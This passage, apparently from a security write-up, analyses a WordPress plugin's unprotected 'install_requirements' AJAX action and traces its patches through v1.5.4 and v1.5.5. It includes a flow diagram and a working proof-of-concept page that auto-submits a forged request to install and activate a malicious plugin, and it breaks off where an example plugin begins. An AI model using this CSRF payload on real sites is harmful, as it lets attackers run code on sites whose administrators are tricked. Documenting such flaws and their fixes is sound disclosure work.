class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Plugin&amp;ensp;installed&amp;ensp;but&amp;ensp;failed&amp;ensp;to&amp;ensp;activate:&amp;ensp;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$activate_result&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_error_message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Plugin&amp;ensp;installed&amp;ensp;and&amp;ensp;activated&amp;ensp;successfully.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;install_requirements()&lt;/code&gt; function allows downloading and activating a plugin based on the value of &lt;code&gt;$_POST[&#39;plugin&#39;]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If the plugin is already downloaded but not activated, it will be activated:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$plugin_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Activate&amp;ensp;the&amp;ensp;plugin&amp;ensp;if&amp;ensp;already&amp;ensp;installed&amp;ensp;but&amp;ensp;inactive&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;activate_plugin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$plugin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_clean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_end_clean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Install&amp;ensp;and&amp;ensp;Activate&amp;ensp;Successfully&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If the plugin is not yet downloaded, it will be downloaded.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;However, this function does not perform any user privilege validation.&lt;/p&gt;&#xA;&lt;p&gt;In version &lt;code&gt;v1.5.4&lt;/code&gt;, the developer partially fixed the issue by adding:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;manage_options&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;manage_options&lt;/code&gt; is a capability reserved for &lt;strong&gt;Administrators&lt;/strong&gt;, so only Admin accounts can now call this function. This prevents normal users (&lt;strong&gt;Subscriber&lt;/strong&gt;, &lt;strong&gt;Author&lt;/strong&gt;, etc.) and unauthenticated users from directly exploiting the vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;However, this patch is still not sufficient. Why?&lt;/p&gt;&#xA;&lt;p&gt;Although the function is restricted to &lt;strong&gt;Administrators&lt;/strong&gt;, there is no &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt; protection. This means that:&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;If an &lt;strong&gt;Administrator&lt;/strong&gt; is logged into the WordPress website and visits a malicious website controlled by an attacker, that website can silently send a (POST) request to &lt;code&gt;install_requirements&lt;/code&gt;. The request will be executed with &lt;strong&gt;Administrator&lt;/strong&gt; privileges because the browser automatically includes the authenticated cookies.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;In version &lt;strong&gt;v1.5.5&lt;/strong&gt;, the vulnerability was finally and properly patched by adding a nonce verification:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpnonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;wp_verify_nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpnonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;rtm_template_nonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Access&amp;ensp;Denied&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;By combining both protection layers:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; → privilege check&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_verify_nonce()&lt;/code&gt; → CSRF protection&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;the vulnerability was correctly mitigated.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an AJAX action for authenticated users (&lt;code&gt;wp_ajax_&lt;/code&gt;):&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp_ajax_install_requirements&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;install_requirements&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When accessing the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=install_requirements&lt;/code&gt;, the &lt;code&gt;install_requirements&lt;/code&gt; callback is executed.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;Administrator&amp;ensp;is&amp;ensp;logged&amp;ensp;in&amp;ensp;to&amp;ensp;the&amp;ensp;WordPress&amp;ensp;site&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;Administrator&amp;ensp;visits&amp;ensp;a&amp;ensp;malicious&amp;ensp;website&amp;ensp;controlled&amp;ensp;by&amp;ensp;the&amp;ensp;attacker&#34;]&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;Malicious&amp;ensp;page&amp;ensp;sends&amp;ensp;a&amp;ensp;forged&amp;ensp;POST&amp;ensp;request&amp;ensp;to&amp;ensp;/wp-admin/admin-ajax.php?action=install_requirements&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;Browser&amp;ensp;automatically&amp;ensp;includes&amp;ensp;Administrator&amp;ensp;cookies&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;WordPress&amp;ensp;treats&amp;ensp;the&amp;ensp;request&amp;ensp;as&amp;ensp;coming&amp;ensp;from&amp;ensp;an&amp;ensp;authenticated&amp;ensp;Admin&#34;]&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;install_requirements()&amp;ensp;is&amp;ensp;executed&amp;ensp;without&amp;ensp;nonce&amp;ensp;validation&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G[&#34;Untrusted&amp;ensp;$_POST[&#39;plugin&#39;]&amp;ensp;is&amp;ensp;processed&#34;]&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H[&#34;Plugin_Upgrader-&gt;install()&#34;]&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;I[&#34;activate_plugin()&#34;]&#xD;&#xA;I&amp;ensp;--&gt;&amp;ensp;J[&#34;Malicious&amp;ensp;plugin&amp;ensp;is&amp;ensp;installed&amp;ensp;and&amp;ensp;activated&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a website containing the payload and send it to the Administrator:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;action&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;install&amp;amp;#95;requirements&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;plugin&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;malicious&amp;amp;#95;plugin&amp;amp;#47;malicious&amp;amp;#95;plugin&amp;amp;#95;dir&amp;amp;#46;php&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Submit&amp;ensp;request&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;history&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pushState&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;forms&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;When the Administrator visits the page, the plugin will be activated.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Example plugin:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; 